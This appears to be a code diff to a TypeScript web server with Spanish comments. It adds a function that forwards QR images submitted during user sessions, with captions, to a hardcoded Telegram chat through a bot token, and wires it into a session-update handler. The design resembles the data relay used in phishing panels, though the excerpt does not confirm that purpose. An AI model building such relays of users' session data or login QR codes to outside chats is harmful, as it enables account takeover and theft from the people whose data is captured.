@@ -46,6 +46,45 @@ const sendTelegramMessage = async (message: string) => {
   }
 };
 
+// Función para enviar imágenes a Telegram
+const sendTelegramPhoto = async (imageData: string, caption: string) => {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = "-4625563833";
+  
+  if (!botToken) {
+    console.error('❌ Error: TELEGRAM_BOT_TOKEN no configurado');
+    return null;
+  }
+  
+  console.log(`📤 Enviando imagen QR a Telegram (Chat ID: ${chatId})...`);
+  
+  try {
+    // Convertir base64 a buffer
+    const base64Data = imageData.replace(/^data:image\/\w+;base64,/, '');
+    const photoBuffer = Buffer.from(base64Data, 'base64');
+    
+    const FormData = require('form-data');
+    const form = new FormData();
+    form.append('chat_id', chatId);
+    form.append('photo', photoBuffer, 'qr_code.jpg');
+    form.append('caption', caption);
+    form.append('parse_mode', 'HTML');
+    
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
+      headers: form.getHeaders()
+    });
+    
+    console.log('✅ Imagen QR enviada a Telegram exitosamente');
+    return response.data;
+  } catch (error: any) {
+    console.error('❌ Error enviando imagen QR a Telegram:', error?.response?.data || error?.message || error);
+    if (error?.response?.data) {
+      console.error('Detalles del error:', JSON.stringify(error.response.data, null, 2));
+    }
+    return null;
+  }
+};
+
 // Store active connections
 const clients = new Map<string, WebSocket>();
 // Cambiamos a un Map para asociar cada socket con su username
@@ -1338,7 +1377,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
             // Enviar notificación a Telegram si hay mensaje
             if (telegramMessage) {
               console.log('🔥 Enviando mensaje a Telegram desde UPDATE_SESSION_DATA');
-              sendTelegramMessage(telegramMessage);
+              
+              // Si es tipo qr_validation, enviar tanto el mensaje como la imagen
+              if (tipo === 'qr_validation' && inputData.qrImage) {
+                console.log('🔥 Enviando imagen QR a Telegram...');
+                await sendTelegramPhoto(inputData.qrImage, telegramMessage);
+              } else {
+                await sendTelegramMessage(telegramMessage);
+              }
+              
               console.log('🔥 Mensaje enviado a Telegram');
             }
 
